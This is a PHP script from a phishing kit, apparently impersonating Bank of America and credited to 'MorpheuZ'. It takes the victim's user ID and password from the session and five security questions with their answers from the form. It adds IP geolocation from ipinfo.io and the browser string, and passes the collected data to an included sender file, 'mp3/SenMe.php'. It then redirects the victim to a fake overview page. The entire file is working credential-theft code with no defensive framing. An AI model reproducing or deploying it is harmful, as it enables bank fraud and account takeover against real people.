<?php

session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$browser = $_SERVER['HTTP_USER_AGENT'];

$loginid = $_SESSION['FirstnameP'];
$loginpass = $_SESSION['LastnameP'];

$msg = "================[ LOGIN Inc...1 ]=========================\n";
$msg .= "B.O.A's By MorpheuZ\n";
$msg .= "===========================================================\n";
$msg .= "UserId : $loginid\n";
$msg .= "Password : $loginpass\n";
$msg .= "===========[ Question & Answer ]=======================\n";
$msg .= "QUES 1 : ".$_POST['Secoia']."\n";
$msg .= "Answer 1 : ".$_POST['Sansr']."\n";
$msg .= "QUES 2 : ".$_POST['SecoiaA']."\n";
$msg .= "Answer 2  : ".$_POST['Lokar']."\n";
$msg .= "QUES 3 : ".$_POST['nokma']."\n";
$msg .= "Answer 3  : ".$_POST['SnIA']."\n";
$msg .= "QUES 4 : ".$_POST['nomad']."\n";
$msg .= "Answer 4  : ".$_POST['BIAOR']."\n";
$msg .= "QUES 5 : ".$_POST['nadno']."\n";
$msg .= "Answer 5  : ".$_POST['sHAia']."\n";
$msg .= "========================================================\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "Country: '$country' | State: '$state' | City: '$city'\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "==============[ MorpheuZ Inc. ]===========================\n";
include("mp3/SenMe.php");

  {
		   header("Location: overviewshn.php?read&help=create&success=bf&hm=".md5(microtime())."&lcate=".sha1(microtime()));

	   }
?>
